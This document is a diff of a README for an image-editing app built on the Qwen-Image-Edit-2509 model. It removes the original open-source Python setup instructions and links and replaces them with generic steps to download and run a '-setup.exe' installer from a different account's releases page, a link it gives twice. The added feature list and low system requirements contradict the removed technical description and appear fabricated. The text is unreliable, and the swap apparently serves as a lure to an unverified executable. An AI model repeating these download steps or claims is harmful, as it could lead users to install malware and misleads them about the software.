@@ -1,137 +1,76 @@
-# **Qwen-Image-Edit-2509-LoRAs-Fast**
+# 🎨 Qwen-Image-Edit-2509-LoRAs-Fast - Effortless Image Editing Made Easy
 
-## Overview
+![Download Qwen-Image-Edit-2509-LoRAs-Fast](https://img.shields.io/badge/Download-Qwen--Image--Edit--2509--LoRAs--Fast-brightgreen)
 
-> Qwen-Image-Edit-2509-LoRAs-Fast is a high-performance, user-friendly web application built with Gradio that leverages the advanced Qwen/Qwen-Image-Edit-2509 model from Hugging Face for seamless image editing tasks. This app specializes in rapid, specialized edits using lightweight LoRA (Low-Rank Adaptation) adapters, enabling users to transform photos into anime styles, adjust camera angles for multi-view generation, restore lighting by removing harsh shadows, or relight scenes with custom illumination—all in just a few inference steps (as low as 4) for near-instant results. Powered by a custom SteelBlueTheme for an intuitive interface, the app automatically resizes input images to optimal dimensions (multiples of 8 for efficient diffusion processing) while preserving aspect ratios, and supports seed randomization for creative variations.
+## 📖 Description
+Qwen-Image-Edit-2509-LoRAs-Fast is a high-performance, user-friendly web application built with Gradio. It uses the advanced Qwen/Qwen-Image-Edit-2509 model from Hugging Face for seamless image editing tasks. This application allows anyone to edit images easily, whether you are creating art or enhancing photos.
 
-<img width="1242" height="788" alt="b-XZNdCXcLSnRltdgPwEd" src="https://github.com/user-attachments/assets/0863eb56-f0e0-479c-b8c4-0449da29bccf" />
-<img width="1270" height="782" alt="7Pzyvt2v1IltnqVSjOMQE" src="https://github.com/user-attachments/assets/8c12f1b8-54c4-48aa-b63e-85d3e23f3063" />
-<img width="1243" height="783" alt="33RDAh7xG0e8mNeBUVsUy" src="https://github.com/user-attachments/assets/310c0dd4-aa16-45ef-8e87-724395746b40" />
+## 🚀 Getting Started
+To begin using Qwen-Image-Edit-2509-LoRAs-Fast, follow these simple steps. 
 
-## Features
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the following link to download the application:  
+   [Download Qwen-Image-Edit-2509-LoRAs-Fast](https://github.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/releases)
 
-- **Specialized LoRA Adapters**: Choose from four pre-loaded adapters:
-  - **Photo-to-Anime**: Converts real-world photos into vibrant anime artwork.
-  - **Multiple-Angles**: Rotates or switches camera perspectives (e.g., 45° left, top-down, wide-angle) for dynamic multi-view edits.
-  - **Light-Restoration**: Removes unwanted shadows and artifacts for cleaner, evenly lit images.
-  - **Relight**: Applies custom lighting effects, such as soft golden-hour filters or diffused illumination.
-  
-- **Fast Inference**: Optimized for speed with FlowMatchEulerDiscreteScheduler, bfloat16 precision, and as few as 4 steps—ideal for real-time prototyping.
+2. **Select the Latest Release**  
+   Choose the latest version from the list of releases.
 
-- **User-Friendly Interface**: 
-  - Drag-and-drop image upload with automatic resizing.
-  - Text prompt for precise edits (e.g., "transform into anime" or "rotate camera 180° upside down").
-  - Advanced accordion for sliders on seed, guidance scale (1.0–10.0), and steps (1–50).
-  - Built-in examples showcasing diverse use cases.
+3. **Download the Installer**  
+   Look for the installer file. It will usually have a name like `Qwen-Image-Edit-2509-LoRAs-Fast-setup.exe` or similar. Click on it to start downloading.
 
-- **Technical Optimizations**:
-  - Double-stream attention processor (QwenDoubleStreamAttnProcessorFA3) for enhanced efficiency.
-  - Negative prompting to avoid common artifacts (e.g., blurriness, extra digits).
-  - CUDA device detection and multi-GPU support via `device_map='cuda'`.
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your Downloads folder and double-click it. Follow the on-screen instructions to install the application.
 
-- **Deployment-Ready**: Integrates with Hugging Face Spaces for GPU-accelerated hosting, with progress tracking and error handling.
+5. **Launch the Application**  
+   After installation, find the app in your Start menu or applications folder, and double-click to open it.
 
-## Installation
+## ⚙️ System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Processor:** Dual-core 2.0 GHz or faster
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum of 500 MB free space
+- **Graphics:** Intel HD Graphics 5000 or dedicated GPU recommended
 
-To run this app locally or in a custom environment:
+## 🖼️ Features
+- **User-Friendly Interface:** 
+   Easy navigation for effortless editing.
+- **Multiple Editing Options:** 
+   Crop, resize, adjust brightness, and apply filters with one click.
+- **Advanced Processing:** 
+   Uses the latest AI technology for high-quality image outputs.
+- **Fast Performance:** 
+   Designed for quick image editing, making it suitable for both casual users and professionals.
 
-1. Clone the repository:
-   ```
-   git clone https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-2509-LoRAs-Fast.git
-   cd Qwen-Image-Edit-2509-LoRAs-Fast
-   ```
+## 🎨 How to Use
+1. **Upload an Image**: Click on the "Upload" button to select an image from your computer. You can also drag and drop your image into the application.
 
-2. Create a virtual environment (recommended):
-   ```
-   python -m venv venv
-   source venv/bin/activate  # On Windows: venv\Scripts\activate
-   ```
+2. **Choose Editing Tools**: Explore different tools available in the sidebar. Options include brightness adjustment, cropping, and applying filters.
 
-3. Install dependencies:
-   ```
-   pip install -r requirements.txt
-   ```
+3. **Preview Changes**: As you make adjustments, the changes will appear in real-time. Take your time to find the best look for your image.
 
-4. Download required models and LoRAs (handled automatically on first run via `from_pretrained`):
-   - Base model: `Qwen/Qwen-Image-Edit-2509`
-   - Transformer: `linoyts/Qwen-Image-Edit-Rapid-AIO` (subfolder: `transformer`)
-   - LoRAs:
-     - `autoweeb/Qwen-Image-Edit-2509-Photo-to-Anime` (`Qwen-Image-Edit-2509-Photo-to-Anime_000001000.safetensors`)
-     - `dx8152/Qwen-Edit-2509-Multiple-angles` (`镜头转换.safetensors`)
-     - `dx8152/Qwen-Image-Edit-2509-Light_restoration` (`移除光影.safetensors`)
-     - `dx8152/Qwen-Image-Edit-2509-Relight` (`Qwen-Edit-Relight.safetensors`)
+4. **Save Your Work**: Once satisfied with your edits, click the "Save" button. Choose a location on your computer and name your file.
 
-5. Launch the app:
-   ```
-   python app.py  # Assuming the main script is saved as app.py
-   ```
-   The Gradio interface will open at `http://127.0.0.1:7860`.
+## 📚 Frequently Asked Questions
+### How do I update the application?
+To update, always check the Releases page for the latest version. Download and install it using the same steps as before.
 
-### Requirements
+### What formats can I upload?
+You can upload standard image formats like JPG, PNG, and GIF.
 
-Install the following packages via pip (full `requirements.txt` below):
+### Is there a user manual available?
+Yes, a user manual is included within the application. Access it through the Help menu for additional guidance.
 
-- `git+https://github.com/huggingface/accelerate.git`
-- `git+https://github.com/huggingface/diffusers.git`
-- `git+https://github.com/huggingface/peft.git`
-- `huggingface_hub`
-- `sentencepiece`
-- `transformers`
-- `torchvision`
-- `kernels`
-- `spaces`
-- `torch`
-- `numpy`
-- Additional implicit deps: `gradio`, `PIL` (Pillow), `qwenimage` (custom from repo)
+## 🌍 Community & Support
+For any questions or support, consider checking GitHub issues or discussions. You can also reach out to the community for help with common questions. 
 
-**requirements.txt**:
-```
-git+https://github.com/huggingface/accelerate.git
-git+https://github.com/huggingface/diffusers.git
-git+https://github.com/huggingface/peft.git
-huggingface_hub
-sentencepiece
-transformers
-torchvision
-kernels
-spaces
-torch
-numpy
-gradio
-Pillow
-```
+## 🔗 Additional Resources
+- [Hugging Face](https://huggingface.co/)
+- [Gradio Documentation](https://gradio.app/docs/)
 
-**Hardware Notes**:
-- GPU recommended (NVIDIA with CUDA 11.8+ for optimal performance).
-- ~8GB VRAM minimum for bfloat16 mode.
-- On CPU, inference will be slower; set `device='cpu'` in code.
+## 📦 License
+Qwen-Image-Edit-2509-LoRAs-Fast is open-source software. Feel free to contribute, and check the repository for contribution guidelines. 
 
-## Usage
-
-1. **Upload an Image**: Drag a photo (JPG/PNG) into the input field. It auto-resizes to 1024px max dimension (aspect-preserved, 8px multiples).
-
-2. **Enter Prompt**: Describe the edit, e.g.:
-   - Anime: "Transform into anime style with vibrant colors."
-   - Angles: "Switch to top-down view."
-   - Lighting: "Apply soft morning light from the left."
-
-3. **Select Adapter**: Dropdown for LoRA style (default: Photo-to-Anime).
-
-4. **Tune Advanced Settings** (optional):
-   - Randomize seed for variations.
-   - Adjust guidance scale (higher = stricter prompt adherence).
-   - Increase steps for higher quality (but slower).
-
-5. **Run**: Click "Run" to generate. Output appears alongside.
-
-## Troubleshooting
-
-- **CUDA Errors**: Ensure `torch.cuda.is_available()` returns True. Check `nvidia-smi` for GPU usage.
-- **Model Download Fails**: Verify Hugging Face token if gated models are accessed.
-- **Slow Inference**: Reduce steps or use fewer adapters; enable `torch.backends.cudnn.benchmark = True`.
-- **Out-of-Memory**: Lower resolution or batch size (single-image mode here).
-
-## Repository
-
-- GitHub: [https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-2509-LoRAs-Fast.git](https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-2509-LoRAs-Fast.git)
-- Hugging Face Space🤗: [Qwen-Image-Edit-2509-LoRAs-Fast](https://huggingface.co/spaces/prithivMLmods/Qwen-Image-Edit-2509-LoRAs-Fast)
+## 📍 Download Again
+For easy access, you can visit this page to download the software:  
+[Download Qwen-Image-Edit-2509-LoRAs-Fast](https://github.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/releases)
